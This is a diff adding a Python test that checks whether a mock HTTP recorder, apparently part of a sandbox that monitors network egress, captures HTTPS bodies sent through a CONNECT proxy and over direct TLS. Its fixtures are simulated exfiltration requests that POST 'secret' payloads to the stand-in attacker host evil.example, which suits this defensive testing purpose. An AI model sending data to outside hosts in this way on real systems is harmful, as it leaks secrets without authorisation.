@@ -96,6 +96,43 @@ class TestRunner:
         assert ev["host"] == "evil.example"
         assert ev["data"] == "secret-body"
 
+    def test_mock_https_via_connect_proxy_and_direct_tls(self, tmp_path: Path) -> None:
+        """Bodies sent over HTTPS must be captured both through CONNECT tunnels and direct TLS."""
+        import ssl
+        import urllib.request
+
+        events = tmp_path / "ev.jsonl"
+        with MockHttpRecorder(events) as mock:
+            ctx = ssl.create_default_context(cafile=str(mock.ca_file))
+            # 1. HTTPS through the proxy (what requests/urllib/curl do with HTTPS_PROXY set)
+            opener = urllib.request.build_opener(
+                urllib.request.ProxyHandler({"https": f"http://{mock.address}"}),
+                urllib.request.HTTPSHandler(context=ctx),
+            )
+            req = urllib.request.Request(
+                "https://evil.example/tunnel", data=b"tunnelled-secret", method="POST"
+            )
+            with opener.open(req, timeout=10) as resp:
+                assert resp.status == 200
+            # 2. Direct TLS to the recorder with SNI (what the runtime shims produce when redirecting sockets)
+            host, port = mock.address.rsplit(":", 1)
+            raw = ssl.create_default_context(cafile=str(mock.ca_file))
+            with raw.wrap_socket(
+                __import__("socket").create_connection((host, int(port))), server_hostname="direct.example"
+            ) as s:
+                s.sendall(
+                    b"POST /direct HTTP/1.1\r\nHost: direct.example\r\nContent-Length: 6\r\nConnection: close\r\n\r\nsecret"
+                )
+                assert s.recv(64).startswith(b"HTTP/1.0 200")
+        evs = [json.loads(line) for line in events.read_text().splitlines()]
+        methods = [(e["method"], e["host"]) for e in evs]
+        assert ("CONNECT", "evil.example:443") in methods
+        tunnelled = next(e for e in evs if e["path"] == "/tunnel")
+        assert tunnelled["data"] == "tunnelled-secret" and tunnelled["tls"] is True
+        assert tunnelled["host"] == "evil.example:443"
+        direct = next(e for e in evs if e["path"] == "/direct")
+        assert direct["data"] == "secret" and direct["host"] == "direct.example" and direct["tls"] is True
+
 
 class TestPlan:
     def test_plan_commands(self, tmp_path: Path) -> None:
